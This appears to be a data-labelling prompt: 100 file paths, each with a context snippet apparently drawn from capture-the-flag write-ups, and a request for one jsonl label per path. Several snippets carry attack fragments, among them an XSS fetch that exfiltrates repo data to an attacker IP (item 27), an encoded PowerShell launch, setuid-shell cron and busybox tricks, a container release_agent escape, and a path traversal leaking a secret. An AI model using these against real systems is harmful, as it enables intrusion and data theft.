@@ -1,0 +1,203 @@
+Label these 100 paths (chunk 5/15).
+Reply with one jsonl code block, one record per path, in input order.
+
+1. /pilgrimage.htb/login.php
+   context: 403w     6173c http://pilgrimage.htb/register.php 200      GET      171l      403w     6166c http://pilgrimage.htb/login.php 301      GET        7l       11w      169c http://pilgrimage.htb/assets => 
+2. C:\Users\ldapreader\Desktop
+   context: PS C:\Users\ldapreader\Desktop> .\Perfusion.exe -c cmd -i [*] Created Performance DLL: C:\Users\LDAPRE~1\AppData\Local\Temp\2\perf
+3. /hacknet.htb/static/jquery-3.7.1.min.js
+   context: created new filter; toggle off with --dont-filter 200      GET        2l     1262w    87533c http://hacknet.htb/static/jquery-3.7.1.min.js 200      GET       22l       56w      667c http://hacknet.htb
+4. /var/www/HackNet/backups
+   context: sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup01.sql.gpg > /dev/shm/backup01.sql gpg: encrypted with 1024-bit RSA key, ID FC
+5. /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+   context: hp *     (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh     (root) NOPASSWD: /usr/local/nagiosxi/scripts/ch
+6. /clicker.htb/admin.php
+   context: ker.htb/assets/js => http://clicker.htb/assets/js/ 302      GET        0l        0w        0c http://clicker.htb/admin.php => http://clicker.htb/index.php 200      GET      114l      266w     3253c ht
+7. /Windows/Tasks/Uploads
+   context: ;      // Your PHP code for handling form submission and file upload goes here.     $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory      if ($_SERVER["REQUEST_METHOD"] == "POST" && 
+8. C:\Users\svc_minecraft\server\plugins
+   context: PS C:\Users\svc_minecraft\server\plugins> ls      Directory: C:\Users\svc_minecraft\server\plugins  Mode                LastWriteTime
+9. /root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/async-trigger.jar
+   context: .5.1.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/maven-settings-builder-3.8.6.jar:/root/TeamCity/webapps/ROOT/WEB-INF/plugins/Maven2/server/async-trigger.jar:/root/TeamCity/webapps/R
+10. /opt/zroweb
+   context: /opt/zroweb
+11. /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+   context: 881  0.0  0.0   2608   596 ?        Ss   Nov21   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar root         882  0.0  0.2   9416  4292 ?   
+12. /user-management-service/target/surefire-reports/com.eureka.Furni.FurniApplicationTests.txt
+   context: rget/maven-archiver/pom.properties ./user-management-service/target/classes/application.properties ./user-management-service/target/surefire-reports/com.eureka.Furni.FurniApplicationTests.txt ./user-m
+13. c:\windows\system32\cmd.exe
+   context: PS C:\programdata> ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0
+14. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_003
+   context: file or directory (2) [2415:2418:0309/174909.482641:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_003": No such file or director
+15. /dev/shm/.0xdf/root.json
+   context: lopez@intuition:/dev/shm$ python3 create.py 0xdf.tar 0xdf.json /dev/shm/.0xdf/root.json lopez@intuition:/dev/shm/.0xdf$ tar -tvf 0xdf.tar  -rw-rw-r-- lopez/lopez       0 2024-05-04 20:15
+16. /bruno.vl/iisstart.png
+   context: vl/aspnet_client => http://bruno.vl/aspnet_client/ 200      GET      334l     2089w   180418c http://bruno.vl/iisstart.png 200      GET       32l       55w      703c http://bruno.vl/ 404      GET     
+17. C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe
+   context: Windows\System32\svchost.exe  1728  892   LockApp.exe              x64   1        HOSPITAL\drbrown  C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe  1852  1712  explorer.exe         
+18. /home/admin
+   context: 'sh$' root:x:0:0:root:/root:/bin/bash remote:x:1000:1000::/home/remote:/bin/bash admin:x:1001:1001::/home/admin:/bin/bash
+19. C:\Users\Caroline.Robinson\Documents
+   context: |_|   |__/  v1.4.1  [*] Connecting to 'BABYDC.baby.vl:5985' as 'Caroline.Robinson' evil-winrm-py PS C:\Users\Caroline.Robinson\Documents>
+20. \\.\pipe\072a5030-acb7-4e49-bd61-f21fe7ca2b09\pipe\epmapper
+   context: 5324582816 [*] UseProtseqFunctionParamCount: 6 [*] HookRPC [*] Start PipeServer [*] CreateNamedPipe \\.\pipe\072a5030-acb7-4e49-bd61-f21fe7ca2b09\pipe\epmapper [*] Trigger RPCSS [*] DCOM obj GUID: 000
+21. /usr/local/bin/login.py
+   context: hrSWRunPath.2123 = STRING: "/usr/bin/python3" HOST-RESOURCES-MIB::hrSWRunParameters.2123 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
+22. /tmp/.ICE-unix
+   context: bob@linkvortex:/$ find / -type d -perm -0002 -perm -1000 2>/dev/null /tmp /tmp/.XIM-unix /tmp/.ICE-unix /tmp/.X11-unix /tmp/.font-unix /tmp/.Test-unix /dev/mqueue /dev/shm /run/lock /var/crash /var/tm
+23. C:\programdata\rev.exe
+   context: 1.39/rev.exe: 100%|████████| 7.00k/7.00k [00:00<00:00, 12.1kB/s] [+] File uploaded successfully as: C:\programdata\rev.exe
+24. /home/john/automation/chromedriver
+   context: mation/administration.py         john        1571  0.4  0.3 33630172 15104 ?      Sl   Sep08   1:31 /home/john/automation/chromedriver --port=60567                  john        1576  0.0  0.0      0  
+25. /home/oxdf/hackthebox/scrambled-10.10.11.168/ldapserver.pem
+   context: 12 #TIMELIMIT      15 #DEREF          never  # TLS certificates (needed for GnuTLS) TLS_CACERT      /home/oxdf/hackthebox/scrambled-10.10.11.168/ldapserver.pem
+26. C:\Users\lorra199\Documents
+   context: messa199'  Evil-WinRM shell v3.4  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\Users\lorra199\Documents>
+27. /dev.snippet.htb/api/v1/repos/charlie/backups/contents
+   context: fetch("http://dev.snippet.htb/api/v1/repos/charlie/backups/contents").then(response => response.json()).then(data => fetch("http://10.10.14.6/"+ btoa(JSON.stringify(da
+28. C:\Users\Administrateur\Desktop
+   context: C:\Users\Administrateur\Desktop> type root.txt 6b4ec7eb************************
+29. /home/sedric
+   context: preter:/$ cat /etc/passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
+30. /mailroom.htb/assets/favicon.ico
+   context: 321w     4336c http://mailroom.htb/services.php 200      GET      320l     1728w   209928c http://mailroom.htb/assets/favicon.ico 200      GET        7l     1031w    78135c http://mailroom.htb/js/boot
+31. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_046
+   context: file or directory (2) [2415:2418:0309/174909.483748:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_046": No such file or director
+32. C:\Users\Administrator\AppData\Roaming\System32\
+   context: istrator\AppData\Roaming\System32\clean-up.ps1 Execute          : powershell.exe WorkingDirectory : C:\Users\Administrator\AppData\Roaming\System32\ PSComputerName   :  PS C:\> (get-scheduledtask -tas
+33. C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z
+   context: \$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> format-hex '.\$IE2XMEG.7z'     Label: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z            Offset Bytes  
+34. C:\Users\winrm_svc\Documents
+   context: ▌ ▄▌ v0.0.8 [*] Connecting to dc01.fluffy.htb:5985 as winrm_svc evil-winrm-py PS C:\Users\winrm_svc\Documents>
+35. /ten.vl/index.php
+   context: t-spam-this-thanks.php => http://ten.vl/signup.php 200      GET      113l      404w     5131c http://ten.vl/index.php 200      GET        9l       25w      205c http://ten.vl/ 200      GET      844l  
+36. /var/lib/docker/overlay2/l/5MM772DWMOBQZAEA4J34QYSZII
+   context: docker/overlay2/l/IAY73KSFENK4CC5DX5L2HCRFQJ:/var/lib/doc ker/overlay2/l/UDDRFLWFZYH6I5EUDCDWCOPSZX:/var/lib/docker/overlay2/l/5MM772DWMOBQZAEA4J34QYSZII,upperdir=/var/lib/docker/overlay2/4ec09ecfa 6f
+37. /home/christine
+   context: root:x:0:0:root:/root:/bin/bash bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash _laurel:x:999:999::/var/log/laurel:/bin/sh
+38. /proc/self/cwd/index.php
+   context: -d 'url=http:// file:///proc/self/cwd/index.php'
+39. /portal.carpediem.htb/logout.php
+   context: l     2174w        0c http://portal.carpediem.htb/ 302      GET        0l        0w        0c http://portal.carpediem.htb/logout.php => ./ 301      GET        9l       28w      326c http://portal.carp
+40. /var/snap/firefox/common/bash
+   context: jonathan@snapped:~$ cat /proc/3718/root/tmp/sh  #!/tmp/busybox sh /tmp/busybox cp /bin/bash /var/snap/firefox/common/bash /tmp/busybox chmod 04755 /var/snap/firefox/common/bash
+41. /home/player
+   context: www-data@soccer:/home/player$ ls -la total 28 drwxr-xr-x 3 player player 4096 Nov 28  2022 . drwxr-xr-x 3 root   root   4096 Nov
+42. /v3/tools/integer/index.php
+   context: /v3/tools/integer/index.php
+43. /etc/remco/templates/010-customers.conf.tmpl
+   context: g_level = "info" log_format = "text"  [[resource]] name = "apache2"  [[resource.template]]   src = "/etc/remco/templates/010-customers.conf.tmpl"   dst = "/etc/apache2/sites-enabled/010-customers.conf
+44. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2C2BEC23A2E
+   context: B3B0B2D3\BBD2AC3ADBAF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2ADC3DABD0A RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\C2C2BEC23A2E RW C:\Windows\SYSVOL\domain\
+45. /opt/security/lib/DecisionTreeClassifier.sav
+   context: f1 = '/opt/security/lib/DecisionTreeClassifier.sav' f2 = '/opt/security/lib/SVC.sav'                  f3 = '/opt/security/lib/GaussianNB.sav'
+46. /opt/RunasCs/RunasCs.exe
+   context: evil-winrm-py PS C:\programdata> upload /opt/RunasCs/RunasCs.exe RunasCs.exe Uploading /opt/RunasCs/RunasCs.exe: 100%|██████████████████████████████████████████████
+47. C:\Windows\TEMP\A63227FD-637C-4C98-A2D6-357A978B97CC
+   context: fo                  DISM   DISM Manager: PID=3280 TID=3372 Successfully loaded the ImageSession at "C:\Windows\TEMP\A63227FD-637C-4C98-A2D6-357A978B97CC" - CDISMManager::LoadRemoteImageSession 2025-05
+48. /usr/bin/chown
+   context: one  /usr/bin/echo "All databases backed up successfully!" /usr/bin/echo "Changing the permissions" /usr/bin/chown root:sys-adm "$BACKUP_DIR" /usr/bin/chmod 774 -R "$BACKUP_DIR" /usr/bin/echo 'Done!'
+49. /home/service/.ssh/id_ed25519.pub
+   context: * NFS         10.129.234.160    41393  10.129.234.160     1337       r--      96.0B          /home/service/.ssh/id_ed25519.pub             * NFS         10.129.234.160    41393  10.129.234.160     133
+50. Z:\hackthebox\bruno-10.129.238.9\app\SampleScanner.exe
+   context: PS > .\SampleScanner.exe You must install or update .NET to run this application.  App: Z:\hackthebox\bruno-10.129.238.9\app\SampleScanner.exe Architecture: x64 Framework: 'Microsoft.NETCore.App', ver
+51. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\03B10A11ABB0
+   context: F2FDA32B RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\02D21CCC0ADD RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\03B10A11ABB0 RW C:\Windows\S
+52. /usr/bin/git
+   context: :/bin,     mail_badpass  User cbrown may run the following commands on snoopy:     (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
+53. /.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key
+   context: 662473E275A0E483A95D24.key    130567      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 03:13 ./.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key    130568      4 -rwxr-xr-x  
+54. /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff/cmd
+   context: f522b842:/# echo "$host_path/cmd" > /mnt/release_agent root@90c7f522b842:/# cat /mnt/release_agent  /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff/cmd
+55. /usr/bin/chsh
+   context: /bin/passwd /usr/bin/mount /usr/bin/gpasswd /usr/bin/su /usr/bin/sudo /usr/bin/umount /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysi
+56. C:\Users\Administrator\Backup
+   context: C:\Users\Administrator\Backup
+57. C:\Users\Administrator\AppData\Roaming\Microsoft\Protect
+   context: vil-winrm-py PS C:\Users\Administrator\AppData\Roaming\Microsoft> ls -force Protect      Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect  Mode                 LastWriteTime        
+58. /var/log/syslog.1
+   context: ar/log/audit/audit.log.1 /var/log/audit/audit.log.3 /var/log/audit/audit.log.2 /var/log/syslog.2.gz /var/log/syslog.1 /var/log/apt/term.log.2.gz /var/log/apt/term.log.5.gz /var/log/apt/term.log.4.gz /
+59. C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\
+   context: ondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="c:             
+60. /caption.htb/Logs
+   context: 4l        8w       94c http://caption.htb/Download 403      GET        4l        8w       94c http://caption.htb/Logs 403      GET        4l        8w       94c http://caption.htb/%7D 403      GET    
+61. /var/www/hat-valley.htb
+   context: ey.htb.conf | grep -v "#" | grep . server {     listen 80;     server_name hat-valley.htb;     root /var/www/hat-valley.htb;     location / {         proxy_set_header X-Forwarded-For $proxy_add_x_forw
+62. /var/list
+   context: sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexiste
+63. /usr/local/sbin/dosconverter
+   context: fication root    ALL=(ALL:ALL) ALL #svcMaestro ALL=(ALL:ALL) NOPASSWD: ALL #ike ALL=(axl) NOPASSWD: /usr/local/sbin/dosconverter # Allow members of group sudo to execute any command %sudo   ALL=(ALL:A
+64. Z:\bagel.dll
+   context: PS > [System.Reflection.AssemblyName]::GetAssemblyName('Z:\bagel.dll')  Version        Name -------        ---- 1.0.0.0        bagel
+65. /etc/system/local/server.conf
+   context: oxdf@hacky$ curl --path-as-is 'http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/server.conf' [general] serverName = dc01 pass4SymmKey = $7$lPCemQk01ejJvI8nwCjXjx7
+66. /opt/gavel/sample.yaml
+   context: auctioneer@gavel:~$ gavel-util submit /opt/gavel/sample.yaml  YAML missing required keys: name description image price rule_msg rule
+67. /var/snap/docker/1125/config/daemon.json
+   context: ata-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json root      1246  0.2  2.1 1351056 44512 ?       Ssl  01:16  
+68. /var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_031
+   context: file or directory (2) [2415:2418:0309/174909.483361:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_031": No such file or director
+69. \\r\nmove
+   context: -Password "Welcome1"\r\ncd ..\\Documents\\\r\nnotepad restart.ps1\r\nexplorer .\r\ndir ..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-A
+70. /etc/php/8.1/cli/php.ini
+   context: /etc/php/8.1/cli/php.ini
+71. C:\Users\svc_winrm\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_winrm\Documents>
+72. /../../../home/web/web/app.py
+   context: ../../../../home/web/web/app.py
+73. C:\Users\steph.cooper_adm\Documents
+   context: Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents>
+74. /root/certs-backup
+   context: /root/certs-backup
+75. /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+   context: oxdf@hacky$ cat /home/oxdf/.sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd | grep 'sh$' root:x:0:0:root:/root:/bin/bash michael:x:1001:1001::/home/michael:/bin/bash
+76. /var/www/itrc/uploads
+   context: www-data@itrc:/var/www/itrc/uploads$ ls -l total 1156 -rw-r--r-- 1 www-data www-data     136 Feb 18 14:20 bc7bf3b3864ecdca3d17e75d37596
+77. C:\Users\Ferdinand\Desktop
+   context: evil-winrm-py PS C:\Users\Ferdinand\Desktop> cat user.txt 255bb5dd************************
+78. /root/.charcol/.charcol_config
+   context: [2026-01-19 22:50:05] [INFO] System password verified successfully. Removed existing config file: /root/.charcol/.charcol_config Charcol application password has been reset to default (no password mod
+79. /var/www/html/SSA/SSA/submissions
+   context: ${HOME}/.ssh #blacklist /opt  blacklist /home/silentobserver whitelist /var/www/html/SSA read-write /var/www/html/SSA/SSA/submissions  noexec /var/www/html/SSA/SSA/submissions
+80. C:\Users\john\Documents
+   context: ▌ ▄▌ v1.0.0 [*] Connecting to dc01.tombwatcher.htb:5985 as john evil-winrm-py PS C:\Users\john\Documents>
+81. /etc/ipa/default.conf
+   context: /etc/ipa/default.conf
+82. C:\Backups\site-backup-2024-12-30.zip
+   context: ups> download site-backup-2024-12-30.zip                                          Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip                                 
+83. C:\Windows\SYSVOL\sysvol\baby2.vl
+   context: operty values:             -  Value size: 105                Id: 100                Value: scripts (C:\Windows\SYSVOL\sysvol\baby2.vl)                Value type: VT_LPWSTR          -  Storage size: 13
+84. C:\users\ryan.cooper\desktop\user.txt
+   context: SQL (sequel\Administrator  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS Contents BulkColumn                                 --------------------
+85. /etc/nginx/mime.types
+   context: t_header Host $host;             proxy_set_header X-Real-IP $remote_addr;             include       /etc/nginx/mime.types;             fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_nam
+86. /classes/Users.php
+   context: /classes/Users.php
+87. /var/www/rainycloud/secrets.py
+   context: oxdf@hacky$ python file_read.py /var/www/rainycloud/secrets.py SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'
+88. /var/www/web/user-management-service
+   context: oscar190@eureka:/var/www/web/user-management-service$ find . -type f ./target/maven-archiver/pom.properties ./target/test-classes/com/eureka/Furni/Furni
+89. C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
+   context: hCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\*" /><FilePathCondition Path="C:               
+90. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\33EFC003BFDB
+   context: B3B0B2D3\0F0FF1F01DBF RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\313B3BF1ABEA RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\33EFC003BFDB RW C:\Windows\SYSVOL\domain\
+91. /root/TeamCity/buildAgent/lib/ehcache-core.jar
+   context: ar:/root/TeamCity/buildAgent/lib/common-graph.jar:/root/TeamCity/buildAgent/lib/xml-rpc-wrapper.jar:/root/TeamCity/buildAgent/lib/ehcache-core.jar:/root/TeamCity/buildAgent/lib/common-tools.jar:/root/
+92. /api.haxtables.htb/v3/tools/string/utils.php
+   context: ttp://api.haxtables.htb/v1/tools/integer/utils.php 200      GET        0l        0w        0c http://api.haxtables.htb/v3/tools/string/utils.php 301      GET        9l       28w      332c http://api.h
+93. \\dc01.ghost.htb\C$\users\administrator\desktop
+   context: PS C:\programdata> dir \\dc01.ghost.htb\C$\users\administrator\desktop      Directory: \\dc01.ghost.htb\C$\users\administrator\desktop  Mode                 LastWriteTime
+94. /var/tmp/0xdf
+   context: charcol> auto add --schedule "* * * * *" --command "bash -c 'cp /bin/bash /var/tmp/0xdf; chown root:root /var/tmp/0xdf; chmod 6777 /var/tmp/0xdf'" --name "0xdf cron" --log-output /tmp/0xd
+95. C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BBD0B0FAFDAF
+   context: FC3CA30F RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BA3A12ADA1BB RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BBD0B0FAFDAF RW C:\Windows\S
+96. /var/www/app
+   context: listen 80;         #listen [::]:80 default_server;         server_name chatbot.htb;         root /var/www/app;         location / {                 # First attempt to serve request as file, then
+97. /styles/embed.css
+   context: :0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;
+98. C:\programdata\rev.dll
+   context: Info: Uploading /media/sf_CTFs/hackthebox/rustykey-10.10.11.75/rev.dll to C:\programdata\rev.dll                                          Data: 12288 bytes of 12288 bytes copied
+99. C:\Users\drbrown.HOSPITAL\.cache\selenium\IEDriverServer\win32\4.14.0\IEDriverServer.exe
+   context: werShell\v1.0\powershell.exe  2744  7816  IEDriverServer.exe       x86   1        HOSPITAL\drbrown  C:\Users\drbrown.HOSPITAL\.cache\selenium\IEDriverServer\win32\4.14.0\IEDriverServer.exe  3088  1496
+100. /root/TeamCity/buildAgent/lib/launcher.jar
+   context: .jar:/root/TeamCity/buildAgent/lib/xml-apis.jar:/root/TeamCity/buildAgent/lib/platform-specific.jar:/root/TeamCity/buildAgent/lib/launcher.jar:/root/TeamCity/buildAgent/lib/connections-api-common.jar:
